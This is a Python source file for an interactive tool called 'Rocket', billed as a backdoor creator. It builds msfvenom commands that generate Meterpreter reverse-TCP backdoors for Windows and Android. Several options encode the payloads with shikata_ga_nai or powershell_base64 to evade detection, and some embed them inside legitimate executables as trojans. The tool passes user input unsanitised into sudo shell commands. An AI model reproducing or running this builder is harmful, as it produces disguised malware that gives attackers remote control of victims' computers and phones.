#!/usr/bin/python3

import os
import random
import sys,traceback

def banner():
    banner1 = """
$$$$$$$\                      $$\                  $$\     
$$  __$$\                     $$ |                 $$ |    
$$ |  $$ | $$$$$$\   $$$$$$$\ $$ |  $$\  $$$$$$\ $$$$$$\   
$$$$$$$  |$$  __$$\ $$  _____|$$ | $$  |$$  __$$\\_$$  _|  
$$  __$$< $$ /  $$ |$$ /      $$$$$$  / $$$$$$$$ | $$ |    
$$ |  $$ |$$ |  $$ |$$ |      $$  _$$<  $$   ____| $$ |$$\ 
$$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ | \$$\ \$$$$$$$\  \$$$$  |
\__|  \__| \______/  \_______|\__|  \__| \_______|  \____/ 

        [ \033[1;90mRocket 1.0     :\033[1;m Backdoor Creator [beta]
+------=[ \033[1;90mCreator        :\033[1;m Muhammad Isa Wijaya Kusuma
+------=[ \033[1;90mCodename       :\033[1;m RConsole
+------=[ \033[1;90mVersion        :\033[1;m 1.0 beta
+------=[ \033[1;90mGithub         :\033[1;m XFSsoftwareteam
    """
    banner2 = """
 _______  _______  _______  _        _______ _________
(  ____ )(  ___  )(  ____ \| \    /\(  ____ \\__   __/
| (    )|| (   ) || (    \/|  \  / /| (    \/   ) (   
| (____)|| |   | || |      |  (_/ / | (__       | |   
|     __)| |   | || |      |   _ (  |  __)      | |   
| (\ (   | |   | || |      |  ( \ \ | (         | |   
| ) \ \__| (___) || (____/\|  /  \ \| (____/\   | |   
|/   \__/(_______)(_______/|_/    \/(_______/   )_(   

        [ \033[1;90mRocket 1.0     :\033[1;m Backdoor Creator [beta]
+------=[ \033[1;90mCreator        :\033[1;m Muhammad Isa Wijaya Kusuma
+------=[ \033[1;90mCodename       :\033[1;m RConsole
+------=[ \033[1;90mVersion        :\033[1;m 1.0 beta
+------=[ \033[1;90mGithub         :\033[1;m XFSsoftwareteam
    """
    banner3 = """
 ______    _______  _______  ___   _  _______  _______ 
|    _ |  |       ||       ||   | | ||       ||       |
|   | ||  |   _   ||       ||   |_| ||    ___||_     _|
|   |_||_ |  | |  ||       ||      _||   |___   |   |  
|    __  ||  |_|  ||      _||     |_ |    ___|  |   |  
|   |  | ||       ||     |_ |    _  ||   |___   |   |  
|___|  |_||_______||_______||___| |_||_______|  |___|

        [ \033[1;90mRocket 1.0     :\033[1;m Backdoor Creator [beta]
+------=[ \033[1;90mCreator        :\033[1;m Muhammad Isa Wijaya Kusuma
+------=[ \033[1;90mCodename       :\033[1;m RConsole
+------=[ \033[1;90mVersion        :\033[1;m 1.0 beta
+------=[ \033[1;90mGithub         :\033[1;m XFSsoftwareteam
    """
    banner4 = """
,------.              ,--.            ,--.   
|  .--. ' ,---.  ,---.|  |,-. ,---. ,-'  '-. 
|  '--'.'| .-. || .--'|     /| .-. :'-.  .-' 
|  |\  \ ' '-' '\ `--.|  \  \\   --.  |  |   
`--' '--' `---'  `---'`--'`--'`----'  `--'

        [ \033[1;90mRocket 1.0     :\033[1;m Backdoor Creator [beta]
+------=[ \033[1;90mCreator        :\033[1;m Muhammad Isa Wijaya Kusuma
+------=[ \033[1;90mCodename       :\033[1;m RConsole
+------=[ \033[1;90mVersion        :\033[1;m 1.0 beta
+------=[ \033[1;90mGithub         :\033[1;m XFSsoftwareteam
    """

    randBanner = [str(banner1),str(banner2),str(banner3),str(banner4)]
    print(random.choice(randBanner))

def backdoorsBanner():
    print("""
        [ \033[1;97mSelect backdoor to start\033[1;m
+------=[ \033[1;97m[1]\033[1;m PLAIN_windowsbackdoor
+------=[ \033[1;97m[2]\033[1;m SHIKATAGANAI_windowsbackdoor
+------=[ \033[1;97m[3]\033[1;m CMDPOWERSHELLBASE64_windowsbackoor
+------=[ \033[1;97m[4]\033[1;m EMBEDDED_CMDPOWERSHELLBASE64_windowsbackdoor
+------=[ \033[1;97m[5]\033[1;m EMBEDDED_SHIKATAGANAI_windowsbackdoor
+------=[ \033[1;97m[6]\033[1;m PLAIN_linuxbackdoor
+------=[ \033[1;97m[7]\033[1;m SHIKATAGANAI_linuxbackdoor
+------=[ \033[1;97m[8]\033[1;m PLAIN_androidbackdoor
+------=[ \033[1;97m[9]\033[1;m CUSTOM_backdoor
    """)
def commandsBanner():
    print("""
        [ \033[1;97mSelect command to take control\033[1;m
+------=[ \033[1;97m[clear         ]\033[1;m clear screen
+------=[ \033[1;97m[ifconfig      ]\033[1;m to show your IP address and specify wlan0
+------=[ \033[1;97m[restart       ]\033[1;m to restart rocket
+------=[ \033[1;97m[exit          ]\033[1;m to exit from rocket
+------=[ \033[1;97m[banner        ]\033[1;m to show banner
+------=[ \033[1;97m[msfconsole    ]\033[1;m to run msfconsole
+------=[ \033[1;97m[show backdoors]\033[1;m to show backdoors are available
+------=[ \033[1;97m[show Commands ]\033[1;m to show commands are available
        [ \033[1;97mThese commands just available on creating mode\033[1;m
+------=[ \033[1;97m[back          ]\033[1;m to back to main menu
+------=[ \033[1;97m[show settings ]\033[1;m to show settings
+------=[ \033[1;97m[set lhost     ]\033[1;m to set listen address
+------=[ \033[1;97m[set lport     ]\033[1;m to set listen port
+------=[ \033[1;97m[set filename  ]\033[1;m to set output filename
+------=[ \033[1;97m[set directory ]\033[1;m to set directory
+------=[ \033[1;97m[create        ]\033[1;m to start creating backdoor
    """)

try:
    #Colors
    #\033[1;90m Dark gray \033[1;m
    #\033[1;91m Light red \033[1;m
    #\033[1;92m Light green \033[1;m
    #\033[1;93m Light yellow \033[1;m
    #\033[1;94m Light blue \033[1;m
    #\033[1;95m Light magenta \033[1;m
    #\033[1;96m Light cyan \033[1;m
    #\033[1;97m Light white \033[1;m
    class Settings:
        lhost = ""
        lport = ""
        embedfile = ""
        filename = ""
        directory = ""
        def Set(self,lhost,lport,embedfile,filename,directory):
            self.lhost = lhost
            self.lport = lport
            self.embedfile = embedfile
            self.filename = filename
            self.directory = directory

    class backdoors:
        #Windows backdoors type
        def PLAIN_windowsbackdoor(self):
            backdoorSettings = Settings()
            while True:
                PLAIN = str(input("\033[1;90mrocket\033[1;m[\033[1;91mPLAIN_windowsbackdoor\033[1;m]# "))
                #Command on creating mode
                if PLAIN == "back":
                    rocket_console()
                elif PLAIN == "show commands":
                    commandsBanner()
                elif PLAIN == "show settings":
                    print("\n"+"LHOST : " + str(backdoorSettings.lhost))
                    print("LPORT : " + str(backdoorSettings.lport))
                    print("Filename : " + str(backdoorSettings.filename))
                    print("Directory : " + str(backdoorSettings.directory)+"\n")
                elif PLAIN == "set lhost":
                     backdoorSettings.lhost = str(input("set \033[1;97mLHOST\033[1;m : "))
                elif PLAIN == "set lport":
                     backdoorSettings.lport = str(input("set \033[1;97mLPORT\033[1;m : "))
                elif PLAIN == "set filename":
                     backdoorSettings.filename = str(input("set \033[1;97mFilename\033[1;m : "))
                elif PLAIN == "set directory":
                     backdoorSettings.directory = str(input("set \033[1;97mDirectory\033[1;m : "))
                elif PLAIN == "create":
                    if backdoorSettings.lhost == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.lport == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.filename == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.directory == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    else:
                        backdoorGENERATE = os.system("sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                #Commands on rocket
                elif PLAIN == "banner":
                    banner()
                elif PLAIN == "clear":
                    clear = os.system("clear")
                elif PLAIN == "restart":
                    StartRocket = os.system("python3 rocket.py")
                    exit()
                elif PLAIN == "exit":
                    exit()
                elif PLAIN == "ifconfig":
                    ifconfig = os.system("ifconfig")
                elif PLAIN == "show backdoors":
                    backdoorsBanner()
                elif PLAIN == "show commands":
                    commandsBanner()
                elif PLAIN == "msfconsole":
                    msfconsole = os.system("msfconsole")
                else:
                    if PLAIN != "":
                        print("\033[1;91m[rocket]\033[1;m command"+" : "+str(PLAIN)+" Command not found")
            pass
        def SHIKATAGANAI_windowsbackdoor(self):
            backdoorSettings = Settings()
            while True:
                SHIKATAGANAI = str(input("\033[1;90mrocket\033[1;m[\033[1;91mSHIKATAGANAI_windowsbackdoor\033[1;m]# "))
                #Command on creating mode
                if SHIKATAGANAI == "back":
                    rocket_console()
                elif SHIKATAGANAI == "show commands":
                    commandsBanner()
                elif SHIKATAGANAI == "show settings":
                    print("\n"+"LHOST : " + str(backdoorSettings.lhost))
                    print("LPORT : " + str(backdoorSettings.lport))
                    print("Filename : " + str(backdoorSettings.filename))
                    print("Directory : " + str(backdoorSettings.directory)+"\n")
                elif SHIKATAGANAI == "set lhost":
                     backdoorSettings.lhost = str(input("set \033[1;97mLHOST\033[1;m : "))
                elif SHIKATAGANAI == "set lport":
                     backdoorSettings.lport = str(input("set \033[1;97mLPORT\033[1;m : "))
                elif SHIKATAGANAI == "set filename":
                     backdoorSettings.filename = str(input("set \033[1;97mFilename\033[1;m : "))
                elif SHIKATAGANAI == "set directory":
                     backdoorSettings.directory = str(input("set \033[1;97mDirectory\033[1;m : "))
                elif SHIKATAGANAI == "create":
                    if backdoorSettings.lhost == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.lport == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.filename == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.directory == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    else:
                        backdoorGENERATE = os.system("sudo msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 -b '\xff' -a x86 --platform windows "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                #Commands on rocket
                elif SHIKATAGANAI == "banner":
                    banner()
                elif SHIKATAGANAI == "clear":
                    clear = os.system("clear")
                elif SHIKATAGANAI == "restart":
                    StartRocket = os.system("python3 rocket.py")
                    exit()
                elif SHIKATAGANAI == "exit":
                    exit()
                elif SHIKATAGANAI == "ifconfig":
                    ifconfig = os.system("ifconfig")
                elif SHIKATAGANAI == "show backdoors":
                    backdoorsBanner()
                elif SHIKATAGANAI == "show commands":
                    commandsBanner()
                elif SHIKATAGANAI == "msfconsole":
                    msfconsole = os.system("msfconsole")
                else:
                    if SHIKATAGANAI != "":
                        print("\033[1;91m[rocket]\033[1;m command"+" : "+str(SHIKATAGANAI)+" Command not found")
            pass
        def CMDPOWERSHELLBASE64_windowsbackoor(self):
            backdoorSettings = Settings()
            while True:
                CMDPOWERSHELLBASE64 = str(input("\033[1;90mrocket\033[1;m[\033[1;91mCMDPOWERSHELLBASE64_windowsbackdoor\033[1;m]# "))
                #Command on creating mode
                if CMDPOWERSHELLBASE64 == "back":
                    rocket_console()
                elif CMDPOWERSHELLBASE64 == "show commands":
                    commandsBanner()
                elif CMDPOWERSHELLBASE64 == "show settings":
                    print("\n"+"LHOST : " + str(backdoorSettings.lhost))
                    print("LPORT : " + str(backdoorSettings.lport))
                    print("Filename : " + str(backdoorSettings.filename))
                    print("Directory : " + str(backdoorSettings.directory)+"\n")
                elif CMDPOWERSHELLBASE64 == "set lhost":
                     backdoorSettings.lhost = str(input("set \033[1;97mLHOST\033[1;m : "))
                elif CMDPOWERSHELLBASE64 == "set lport":
                     backdoorSettings.lport = str(input("set \033[1;97mLPORT\033[1;m : "))
                elif CMDPOWERSHELLBASE64 == "set filename":
                     backdoorSettings.filename = str(input("set \033[1;97mFilename\033[1;m : "))
                elif CMDPOWERSHELLBASE64 == "set directory":
                     backdoorSettings.directory = str(input("set \033[1;97mDirectory\033[1;m : "))
                elif CMDPOWERSHELLBASE64 == "create":
                    if backdoorSettings.lhost == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.lport == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.filename == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.directory == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    else:
                        backdoorGENERATE = os.system("sudo msfvenom -p windows/meterpreter/reverse_tcp -e cmd/powershell_base64 -i 10 -b '\xff' -a x86 --platform windows "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                #Commands on rocket
                elif CMDPOWERSHELLBASE64 == "banner":
                    banner()
                elif CMDPOWERSHELLBASE64 == "clear":
                    clear = os.system("clear")
                elif CMDPOWERSHELLBASE64 == "restart":
                    StartRocket = os.system("python3 rocket.py")
                    exit()
                elif CMDPOWERSHELLBASE64 == "exit":
                    exit()
                elif CMDPOWERSHELLBASE64 == "ifconfig":
                    ifconfig = os.system("ifconfig")
                elif CMDPOWERSHELLBASE64 == "show backdoors":
                    backdoorsBanner()
                elif CMDPOWERSHELLBASE64 == "show commands":
                    commandsBanner()
                elif CMDPOWERSHELLBASE64 == "msfconsole":
                    msfconsole = os.system("msfconsole")
                else:
                    if CMDPOWERSHELLBASE64 != "":
                        print("\033[1;91m[rocket]\033[1;m command"+" : "+str(CMDPOWERSHELLBASE64)+" Command not found")
            pass
        def EMBEDDED_CMDPOWERSHELLBASE64_windowsbackdoor(self):
            backdoorSettings = Settings()
            while True:
                EMBEDDED_CMD = str(input("\033[1;90mrocket\033[1;m[\033[1;91mEMBEDDED_CMDPOWERSHELLBASE64_windowsbackdoor\033[1;m]# "))
                #Command on creating mode
                if EMBEDDED_CMD == "back":
                    rocket_console()
                elif EMBEDDED_CMD == "show commands":
                    commandsBanner()
                elif EMBEDDED_CMD == "show settings":
                    print("\n"+"LHOST : " + str(backdoorSettings.lhost))
                    print("LPORT : " + str(backdoorSettings.lport))
                    print("Embedfile : " + str(backdoorSettings.embedfile))
                    print("Filename : " + str(backdoorSettings.filename))
                    print("Directory : " + str(backdoorSettings.directory)+"\n")
                elif EMBEDDED_CMD == "set lhost":
                     backdoorSettings.lhost = str(input("set \033[1;97mLHOST\033[1;m : "))
                elif EMBEDDED_CMD == "set lport":
                     backdoorSettings.lport = str(input("set \033[1;97mLPORT\033[1;m : "))
                elif EMBEDDED_CMD == "set embedfile":
                     backdoorSettings.embedfile = str(input("set \033[1;97mEmbedfile\033[1;m : "))
                elif EMBEDDED_CMD == "set filename":
                     backdoorSettings.filename = str(input("set \033[1;97mFilename\033[1;m : "))
                elif EMBEDDED_CMD == "set directory":
                     backdoorSettings.directory = str(input("set \033[1;97mDirectory\033[1;m : "))
                elif EMBEDDED_CMD == "create":
                    if backdoorSettings.lhost == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.lport == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.embedfile == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.filename == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.directory == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    else:
                        backdoorGENERATE = os.system("sudo msfvenom -a x86 --platform windows -x "+str(backdoorSettings.embedfile)+" -p windows/meterpreter/reverse_tcp LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -e cmd/powershell_base64 -i 10 -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                #Commands on rocket
                elif EMBEDDED_CMD == "banner":
                    banner()
                elif EMBEDDED_CMD == "clear":
                    clear = os.system("clear")
                elif EMBEDDED_CMD == "restart":
                    StartRocket = os.system("python3 rocket.py")
                    exit()
                elif EMBEDDED_CMD == "exit":
                    exit()
                elif EMBEDDED_CMD == "ifconfig":
                    ifconfig = os.system("ifconfig")
                elif EMBEDDED_CMD == "show backdoors":
                    backdoorsBanner()
                elif EMBEDDED_CMD == "show commands":
                    commandsBanner()
                elif EMBEDDED_CMD == "msfconsole":
                    msfconsole = os.system("msfconsole")
                else:
                    if EMBEDDED_CMD != "":
                        print("\033[1;91m[rocket]\033[1;m command"+" : "+str(EMBEDDED_CMD)+" Command not found")
            pass

        def EMBEDDED_SHIKATAGANAI_windowsbackdoor(self):
            backdoorSettings = Settings()
            while True:
                EMBEDDED_SHIKATA = str(input("\033[1;90mrocket\033[1;m[\033[1;91mEMBEDDED_SHIKATAGANAI_windowsbackdoor\033[1;m]# "))
                #Command on creating mode
                if EMBEDDED_SHIKATA == "back":
                    rocket_console()
                elif EMBEDDED_SHIKATA == "show commands":
                    commandsBanner()
                elif EMBEDDED_SHIKATA == "show settings":
                    print("\n"+"LHOST : " + str(backdoorSettings.lhost))
                    print("LPORT : " + str(backdoorSettings.lport))
                    print("Embedfile : " + str(backdoorSettings.embedfile))
                    print("Filename : " + str(backdoorSettings.filename))
                    print("Directory : " + str(backdoorSettings.directory)+"\n")
                elif EMBEDDED_SHIKATA == "set lhost":
                     backdoorSettings.lhost = str(input("set \033[1;97mLHOST\033[1;m : "))
                elif EMBEDDED_SHIKATA == "set lport":
                     backdoorSettings.lport = str(input("set \033[1;97mLPORT\033[1;m : "))
                elif EMBEDDED_SHIKATA == "set embedfile":
                     backdoorSettings.embedfile = str(input("set \033[1;97mEmbedfile\033[1;m : "))
                elif EMBEDDED_SHIKATA == "set filename":
                     backdoorSettings.filename = str(input("set \033[1;97mFilename\033[1;m : "))
                elif EMBEDDED_SHIKATA == "set directory":
                     backdoorSettings.directory = str(input("set \033[1;97mDirectory\033[1;m : "))
                elif EMBEDDED_SHIKATA == "create":
                    if backdoorSettings.lhost == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.lport == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.embedfile == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.filename == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.directory == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    else:
                        backdoorGENERATE = os.system("sudo msfvenom -a x86 --platform windows -x "+str(backdoorSettings.embedfile)+" -p windows/meterpreter/reverse_tcp LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -e x86/shikata_ga_nai -i 10 -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                #Commands on rocket
                elif EMBEDDED_SHIKATA == "banner":
                    banner()
                elif EMBEDDED_SHIKATA == "clear":
                    clear = os.system("clear")
                elif EMBEDDED_SHIKATA == "restart":
                    StartRocket = os.system("python3 rocket.py")
                    exit()
                elif EMBEDDED_SHIKATA == "exit":
                    exit()
                elif EMBEDDED_SHIKATA == "ifconfig":
                    ifconfig = os.system("ifconfig")
                elif EMBEDDED_SHIKATA == "show backdoors":
                    backdoorsBanner()
                elif EMBEDDED_SHIKATA == "show commands":
                    commandsBanner()
                elif EMBEDDED_SHIKATA == "msfconsole":
                    msfconsole = os.system("msfconsole")
                else:
                    if EMBEDDED_SHIKATA != "":
                        print("\033[1;91m[rocket]\033[1;m command"+" : "+str(EMBEDDED_SHIKATA)+" Command not found")
            pass
        #Linux backdoors type
        def PLAIN_linuxbackdoor(self):
            print("PLAIN_linuxbackdoor")
        def SHIKATAGANAI_linuxbackdoor(self):
            print("SHIKATAGANAI_linuxbackdoor")
        
        #Android backdoors type
        def PLAIN_androidbackdoor(self):
            backdoorSettings = Settings()
            while True:
                PLAIN_ANDROID = str(input("\033[1;90mrocket\033[1;m[\033[1;91mPLAIN_androidbackdoor\033[1;m]# "))
                #Command on creating mode
                if PLAIN_ANDROID == "back":
                    rocket_console()
                elif PLAIN_ANDROID == "show commands":
                    commandsBanner()
                elif PLAIN_ANDROID == "show settings":
                    print("\n"+"LHOST : " + str(backdoorSettings.lhost))
                    print("LPORT : " + str(backdoorSettings.lport))
                    print("Filename : " + str(backdoorSettings.filename))
                    print("Directory : " + str(backdoorSettings.directory)+"\n")
                elif PLAIN_ANDROID == "set lhost":
                     backdoorSettings.lhost = str(input("set \033[1;97mLHOST\033[1;m : "))
                elif PLAIN_ANDROID == "set lport":
                     backdoorSettings.lport = str(input("set \033[1;97mLPORT\033[1;m : "))
                elif PLAIN_ANDROID == "set filename":
                     backdoorSettings.filename = str(input("set \033[1;97mFilename\033[1;m : "))
                elif PLAIN_ANDROID == "set directory":
                     backdoorSettings.directory = str(input("set \033[1;97mDirectory\033[1;m : "))
                elif PLAIN_ANDROID == "create":
                    if backdoorSettings.lhost == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.lport == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.filename == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    elif backdoorSettings.directory == "":
                        print("\033[1;91m[rocket]\033[1;m"+" Process of creating backdoor can not be continued")
                        print("\033[1;91m[rocket]\033[1;m"+" Because on of settings is invalid, let's check it sir'")
                    else:
                        backdoorGENERATE = os.system("sudo msfvenom -p android/meterpreter/reverse_tcp -a dalvik --platform android "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" R > "+str(backdoorSettings.directory)+str(backdoorSettings.filename))
                #Commands on rocket
                elif PLAIN_ANDROID == "banner":
                    banner()
                elif PLAIN_ANDROID == "clear":
                    clear = os.system("clear")
                elif PLAIN_ANDROID == "restart":
                    StartRocket = os.system("python3 rocket.py")
                    exit()
                elif PLAIN_ANDROID == "exit":
                    exit()
                elif PLAIN_ANDROID == "ifconfig":
                    ifconfig = os.system("ifconfig")
                elif PLAIN_ANDROID == "show backdoors":
                    backdoorsBanner()
                elif PLAIN_ANDROID == "show commands":
                    commandsBanner()
                elif PLAIN_ANDROID == "msfconsole":
                    msfconsole = os.system("msfconsole")
                else:
                    if PLAIN_ANDROID != "":
                        print("\033[1;91m[rocket]\033[1;m command"+" : "+str(PLAIN_ANDROID)+" Command not found")
            pass

    def rocket_console():
        backdoorList = backdoors()
        rocket_console = ""
        while True:
            rocket_console = str(input("\033[1;90mrocket\033[1;m# "))
            #Windows backdoor Selection
            if rocket_console == "1":
                backdoorList.PLAIN_windowsbackdoor()
            elif rocket_console == "2":
                backdoorList.SHIKATAGANAI_windowsbackdoor()
            elif rocket_console == "3":
                backdoorList.CMDPOWERSHELLBASE64_windowsbackoor()
            elif rocket_console == "4":
                backdoorList.EMBEDDED_CMDPOWESHELLBASE64_windowsbackdoor()
            elif rocket_console == "5":
                backdoorList.EMBEDDED_SHIKATAGANAI_windowsbackdoor()
            #Linux backdoor Selection
            elif rocket_console == "6":
                backdoorList.PLAIN_linuxbackdoor()
            elif rocket_console == "7":
                backdoorList.SHIKATAGANAI_linuxbackdoor()
            #Android backdoor Selection
            elif rocket_console == "8":
                backdoorList.PLAIN_androidbackdoor()
            #Commands on rocket
            elif rocket_console == "banner":
                banner()
            elif rocket_console == "clear":
                clear = os.system("clear")
            elif rocket_console == "restart":
                StartRocket = os.system("python3 rocket.py")
                exit()
            elif rocket_console == "exit":
                exit()
            elif rocket_console == "ifconfig":
                ifconfig = os.system("ifconfig")
            elif rocket_console == "show backdoors":
                backdoorsBanner()
            elif rocket_console == "show commands":
                commandsBanner()
            elif rocket_console == "msfconsole":
                msfconsole = os.system("msfconsole")
            else:
                if rocket_console != "":
                    print("\033[1;91m[rocket]\033[1;m command"+" : "+str(rocket_console)+" Command or Backdoor not found")
        pass
    
    def Main():
        banner()
        rocket_console()
    
    if __name__ == "__main__":
        Main()

except KeyboardInterrupt:
    print("Shutdown Requested .......")
